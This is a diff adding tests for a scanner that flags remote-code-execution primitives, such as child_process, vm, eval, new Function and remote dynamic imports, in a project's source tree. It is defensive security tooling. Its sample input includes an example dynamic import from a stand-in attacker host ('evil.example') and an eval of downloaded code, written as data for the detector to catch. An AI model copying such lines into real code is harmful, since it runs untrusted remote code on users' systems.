@@ -446,6 +446,87 @@ test("verify-no-unsafe-buffer accepts the live src/ tree", async () => {
   );
 });
 
+// ---------- verify-no-remote-exec (Aikido BlokTrooper gate) ----------
+
+test("verify-no-remote-exec flags every documented BlokTrooper-class primitive", async () => {
+  const { findForbiddenRemoteExecCalls } = await import(
+    "../scripts/verify-no-remote-exec.js"
+  );
+  const sample = [
+    "// safe: API references in prose should not trip the gate",
+    'const note = "do not call eval() or new Function() in core";',
+    "// safe: member-access .eval(...) is a foreign method (e.g. Redis Lua)",
+    "client.eval(SCRIPT, [k], [v]);",
+    "",
+    "// unsafe: ESM import of child_process",
+    'import { spawn } from "node:child_process";',
+    "",
+    "// unsafe: ESM import of vm",
+    "import * as vm from 'vm';",
+    "",
+    "// unsafe: bare eval() of a downloaded string",
+    "const r = eval(downloaded);",
+    "",
+    "// unsafe: new Function compiles a string into JS",
+    'const fn = new Function("return 1");',
+    "",
+    "// unsafe: dynamic remote import",
+    'const mod = await import("https://evil.example/x.js");',
+  ].join("\n");
+  const findings = findForbiddenRemoteExecCalls("sample.ts", sample);
+  assert.equal(findings.length, 5, JSON.stringify(findings, null, 2));
+  assert.match(findings[0]!.reason, /child_process/);
+  assert.match(findings[1]!.reason, /node:vm/);
+  assert.match(findings[2]!.reason, /eval/);
+  assert.match(findings[3]!.reason, /new Function/);
+  assert.match(findings[4]!.reason, /remote dynamic/);
+});
+
+test("verify-no-remote-exec ignores forbidden tokens inside comments and strings", async () => {
+  const { findForbiddenRemoteExecCalls } = await import(
+    "../scripts/verify-no-remote-exec.js"
+  );
+  const sample = [
+    "/* This block comment mentions eval() and new Function() and must not trip. */",
+    'const msg = "do not call eval() or new Function() here";',
+    "// import { spawn } from 'node:child_process' -- this is a comment",
+    "const ok = 1;",
+    "// safe: member-access .eval method (Redis Lua)",
+    "await redis.eval(script, keys, args);",
+  ].join("\n");
+  const findings = findForbiddenRemoteExecCalls("sample.ts", sample);
+  assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
+});
+
+test("verify-no-remote-exec accepts the live src/ tree", async () => {
+  const { findForbiddenRemoteExecCalls } = await import(
+    "../scripts/verify-no-remote-exec.js"
+  );
+  const { readFile, readdir } = await import("node:fs/promises");
+  const path = await import("node:path");
+  const srcRoot = path.resolve(process.cwd(), "src");
+  async function* walk(dir: string): AsyncGenerator<string> {
+    for (const entry of await readdir(dir, { withFileTypes: true })) {
+      const child = path.join(dir, entry.name);
+      if (entry.isDirectory()) yield* walk(child);
+      else if (entry.isFile() && /\.(?:m?ts|m?js)$/.test(entry.name)) yield child;
+    }
+  }
+  let total = 0;
+  for await (const absolute of walk(srcRoot)) {
+    const rel = path.relative(process.cwd(), absolute);
+    const text = await readFile(absolute, "utf8");
+    total += findForbiddenRemoteExecCalls(rel, text).length;
+  }
+  assert.equal(
+    total,
+    0,
+    "src/ must remain free of `node:child_process`, `node:vm`, bare `eval(...)`, " +
+      "`new Function(...)`, and remote dynamic imports; see " +
+      "https://www.aikido.dev/blog/fast-draft-open-vsx-bloktrooper",
+  );
+});
+
 // ---------- verify-no-leaked-credentials ----------
 
 test("scanFileContentForCredentials catches every documented secret pattern", () => {
